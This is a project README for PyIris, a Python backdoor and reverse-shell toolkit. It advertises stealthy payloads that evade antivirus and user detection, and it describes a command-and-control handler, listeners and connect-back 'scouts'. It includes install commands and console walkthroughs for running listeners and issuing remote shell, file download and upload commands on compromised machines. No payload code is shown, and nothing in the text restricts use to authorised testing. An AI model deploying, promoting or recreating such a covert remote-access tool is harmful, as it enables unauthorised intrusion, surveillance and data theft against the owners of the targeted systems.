<p float="left">
  <img src="https://user-images.githubusercontent.com/32593795/33316662-a7429c60-d46f-11e7-8e05-211e8baa0f26.png" width="200" />
</p>

# PyIris
PyIris (the shortened name of Python-Iris), is a post exploitation reverse shell toolkit used in order to gain access onto remote 
systems stealthily. PyIris utilises multi-platform, reverse TCP payloads that can effectively evade modern antivirus, firewalls and user 
detection even after being compiled into executable files.

# Screenshots
<p float="left">
  <img src="https://user-images.githubusercontent.com/32593795/33306044-b6bf0986-d44b-11e7-86ed-5c2037e2fbe0.png" /> 
  <img src="https://user-images.githubusercontent.com/32593795/33306347-29be83fc-d44d-11e7-91f4-b1a514ec0353.png" />
</p>

# Features
- Cross-platform
- Remote command execution
- File transfers
- Remote Keystroke injection
- Remote clipboard manipulation
- Mouse movement and clicking manipulation

# PyIris' Arsenal
## Handler
The handler is the command and control server of PyIris, it manages listeners and scouts. It's aim is to provide an easy to use 
interface to allow the user to communicate and command the various payloads deployed onto remote systems and the various active 
listeners.
## Listener
The main aim of the listener is to sit and wait for the payloads to connect back to the command and control server. The listener 
refers to a "server key" that each payload is outfitted with. If the payload sends the correct key to the server it is granted access, 
otherwise the connection is torn down and rejected.
## Scouts
These are the payloads that connect back to the handler. They are scripted in python and can be compiled into stealthy evasive 
executable files. Each payload has its own core function such as remote code execution, input injection, cyber reconnaissance and so on. 
These scouts can be easily deployed, each has an ip_addr and port variable that tell it where to connect back to, these are modified and 
then deployed, either as exectuables or .py files which attempt to connect back to the server.

# Getting Started
## Prerequisites
- Python 2.x
- Python 2.x pip
- Python 3.x(You only need python 3.x if you use linux)
- Python 3.x pip(You only need python 3.x pip if you use linux)
- Git
## Setup(Linux)
Run the following commands as root user.

```git clone https://github.com/angus-y/pyIris-backdoor```

```cd pyIris-backdoor```

```pip3 install python3-xlib```

```sudo apt-get install scrot```

```sudo apt-get install python3-tk```

```sudo apt-get install python3-dev```

```pip install -r linux_requirements.txt```

## Setup(Windows)
To git clone on windows you need to have the [Git bash shell](https://www.atlassian.com/git/tutorials/install-git) installed.

```git clone https://github.com/angus-y/pyIris-backdoor```

```cd pyIris-backdoor```

```C:\Python27\Scripts\pip install -r windows_requirements.txt```

The path does not have to be the one mentioned above, use the absolute path to your version of pip2.

## Updating PyIris
PyIris is a project undergoing heavy development and debugging, make sure to update often by running these commands in the PyIris
folder. Check out CHANGELOG.md in the repo to see whats new, whats removed and whats fixed.

```git pull```

```pip install -r linux_requirements.txt/windows_requirements.txt```

Again, the pip install depends on your operating system.

# Basic Usage
Run these in the PyIris folder
## Running the server in Windows cmd/powershell
```py -2 PyIris.py```
## Running the server in Linux terminal
```python2 PyIris.py```
## Setting up the listener
Setting up a listener is simple, navigate to the listeners handler and start a listener on a free port. Run ```show``` to list all 
active listeners. To view all commands in any of the handlers(listeners,scouts or payload) run ```help```.

```
PyIris > listeners
[+]Switching...
PyIris (Listeners) > start 9999
[+]Listener started and bound to port : 9999
PyIris (Listeners) > show

[*]Currently active listeners :

ID      Port
==      ====
1       9999
```

The scouts by default connect to port 9999 but this can be changed in the port variable.

## Managing and interacting with Scouts
To return to the default/root mode, run ```back```. Then enter the scouts handler by running ```scouts```. Once a scout connects back, 
run ```show``` to view all connected scouts and stats. Use ```help``` to view the full help menu.

```
PyIris (Listeners) > back

[+]Returning...
PyIris > scouts
[+]Switching...
PyIris (Scouts) > show

[*]Currently active scouts :

ID      IP              User info               Type of scout   Operating System
==      ==              =========               =============   ================
1       127.0.0.1       DELL-LAPTOP/angus       Command Shell   Windows-10-10.0.15063
2       192.168.0.100   ubuntu/angus            Input Injector  Linux-4.10.0-38-generic-x86_64-with-Ubuntu-16.04-xenial
```

To interact with a scout run ```bridge <ID of scout>``` in the scouts handler.

```
PyIris (Scouts) > bridge 1
[+]Bridged to scout of ID : 1
PyIris (Command Shell) > help

Command Shell Menu
==================

   Global Commands :
      banner                            Display a banner
      help                              Show the help menu
      quit                              Quit the console
      clear                             Clear the screen

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill tbe scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Command Shell Commands :
      exec <shell command>              Executes shell command and returns output
      exec_file <file/executable>       Executes a file/executable without blocking
      toggle                            toggle whether commands are run by powershell or cmd

   File Commands :
      download <filepath>               Download file
      dump <filepath>                   Dump and view file content(supports .docx file)
      upload <filepath>                 Upload a file
      web_download <url>                Download a file through a url
```

Once an interaction with a scout has been started you can run ```help``` to view the scouts help menu.

# Built with
- [PyCharm IDE](https://www.jetbrains.com/pycharm/)
- Logo made with [Adobe Illustrator CC 2018](http://www.adobe.com/sea/products/illustrator.html)

# Bugs, suggestions or inquiries?
- Create an issue
- Email me at 1010angusx@gmail.com

# Credits
- Inspired by [Powershell Empire](https://github.com/EmpireProject/Empire) and [Brain Damage](https://github.com/mehulj94/BrainDamage)

# License
Licensed under Mozilla Public License Version 2.0.
